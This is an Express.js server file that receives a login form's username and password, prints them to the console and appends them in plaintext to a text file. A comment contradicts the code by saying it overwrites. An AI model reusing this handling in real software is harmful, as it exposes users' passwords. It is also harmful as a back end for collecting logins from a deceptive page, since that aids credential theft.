const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = 4000;

// Serve static files from the "public" directory
app.use(express.static(path.join(__dirname, 'public')));

// Serve the index.html file when the root URL is accessed
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'templets/index.html'));
});

// Middleware to parse JSON and form data
app.use(express.json()); // For JSON data
app.use(express.urlencoded({ extended: true })); // For form data

// Handle form submission
app.post('/submit', (req, res) => {
    const input1 = req.body.username;
    const input2 = req.body.password;
    console.log(req.body);

    // Save the data to a text file (overwrite instead of append)
    const data = `${input1} : ${input2}\n`;
    fs.appendFile('data.txt', data, (err) => {
        if (err) {
            console.error('Error saving data:', err);
            res.status(500).send('Error saving data');
        } else {
            console.log('Data saved successfully');
            // Redirect back to the form page with a success query parameter
            res.redirect('/?success=true');
        }
    });
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});